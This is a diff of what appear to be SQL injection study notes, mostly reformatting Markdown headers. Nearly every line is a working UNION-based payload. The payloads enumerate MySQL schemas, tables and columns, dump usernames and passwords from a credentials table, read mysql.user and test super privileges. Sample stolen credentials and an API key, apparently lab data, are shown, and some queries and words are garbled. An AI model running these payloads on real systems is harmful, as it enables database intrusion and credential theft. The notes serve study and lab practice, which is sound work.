@@ -13,11 +13,10 @@ test' OR id = 4)-- -
 
 UNION select 1,database(),2,3-- -
 
-## dump databases;
-this command mysql dump all data;
+## dump databases:
 		UNION select 1,2,SCHEMA_NAME,4 FROM INFORMATION_SCHEMA.SCHEMATA-- - 
 		
-example:
+### example:
 		UNION select 1,2,schema_name,4 from INFORMATION_SCHEMA.SCHEMATA-- -
 		DATABSES="information_schema,mysqL,performance_schema,backup,dev"
 
@@ -25,7 +24,7 @@ example:
 
 	' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='name_db'-- -
 
-example
+### example
 
 	' union select 1,table_name,table_schema,4 from information_schema.tables where table_schema='dev'-- -
 	TABLES="framework,pages,credentials,posts"
@@ -34,7 +33,7 @@ example
 
 	' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='name_table'-- -
 
-example
+### example
 	' union select 1,column_name,table_name,table_schema from information_schema.columns where table_name='credentials'-- -
 
 COLUMNS="username,password"
@@ -42,15 +41,15 @@ COLUMNS="username,password"
 ## dump data
 
 	UNION select 1, username, password, 4 from dev.credentials-- -
-example :
+### example :
 	union select  1,username,password 4 from dev.credentials-- -
-OR	
+### OR	
 	union select  1,2,group_concat(username,":",password),4 from dev.credentials-- -
 
-admin	password	
-dev_admin	admin123	
-api_key	MzkyMDM3ZGJiYTUxZjY5Mjc3DFNGFDmQ2YFGDF2VmYjZkZDU0NmHGFDQgIC0K	
-software_engineer	3920aaaaadfsdf37dbba51f692776d6cefb6dd546d
+		admin	password	
+		dev_admin	admin123	
+		api_key	MzkyMDM3ZGJiYTUxZjY5Mjc3DFNGFDmQ2YFGDF2VmYjZkZDU0NmHGFDQgIC0K	
+		software_engineer	3920aaaaadfsdf37dbba51f692776d6cefb6dd546d
 
 if want understand a lot information linke website mysql
 https://dev.mysql.com/doc/refman/8.0/en/information-schema-introduction.html
@@ -64,16 +63,16 @@ Privileges:eading data is much more common than writing data, which is strictly 
 	SELECT CURRENT_USER()
 	SELECT user from mysql.user
 
-command : 
+### commands : 
 		UNION SELECT 1, user(), 3, 4-- -
 		UNION SELECT 1, user, 3, 4 from mysql.user-- -
 
 ## User Privileges
 Now that we know our users, we can start looking for what privileges we have with that user. First of all, we can test if we have super admin privileges with the following query:
 
-SELECT super_priv FROM mysql.user
+		SELECT super_priv FROM mysql.user
 
-example:
+### example:
 	
 		UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
 
